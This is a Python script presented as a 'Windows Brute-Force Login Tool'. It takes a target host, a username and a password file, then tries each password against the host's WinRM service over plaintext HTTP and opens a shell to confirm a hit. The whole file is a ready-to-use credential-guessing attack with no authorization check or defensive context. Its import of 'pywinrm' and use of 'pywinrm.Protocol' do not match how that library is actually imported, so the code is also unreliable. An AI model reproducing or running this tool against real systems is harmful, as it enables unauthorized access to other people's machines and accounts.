import argparse
import pywinrm
import logging

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def brute_force_login(target, username, password_list):
    """
    Attempts to brute-force login to a Windows system using WinRM.

    :param target: Target system's IP or hostname
    :param username: Username for login attempts
    :param password_list: List of passwords to try
    """
    for password in password_list:
        try:
            logging.info(f"Trying password: {password}")
            session = pywinrm.Protocol(
                endpoint=f'http://{target}:5985/wsman',
                transport='plaintext',
                username=username,
                password=password
            )
            # Attempt to open a shell to test credentials
            shell_id = session.open_shell()
            session.close_shell(shell_id)
            logging.info(f"Successful login with password: {password}")
            return password
        except Exception as e:
            logging.warning(f"Login attempt failed for password: {password} - {e}")
    logging.error("Brute-force attack failed. No password succeeded.")
    return None


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Windows Brute-Force Login Tool")
    parser.add_argument("-t", "--target", required=True, help="Target IP or hostname")
    parser.add_argument("-u", "--username", required=True, help="Username for login attempts")
    parser.add_argument("-p", "--passwords", required=True, help="File containing passwords (one per line)")

    args = parser.parse_args()

    # Read password list from file
    try:
        with open(args.passwords, 'r') as file:
            passwords = [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        logging.error("Password file not found.")
        exit(1)

    # Perform brute-force attack
    brute_force_login(args.target, args.username, passwords)
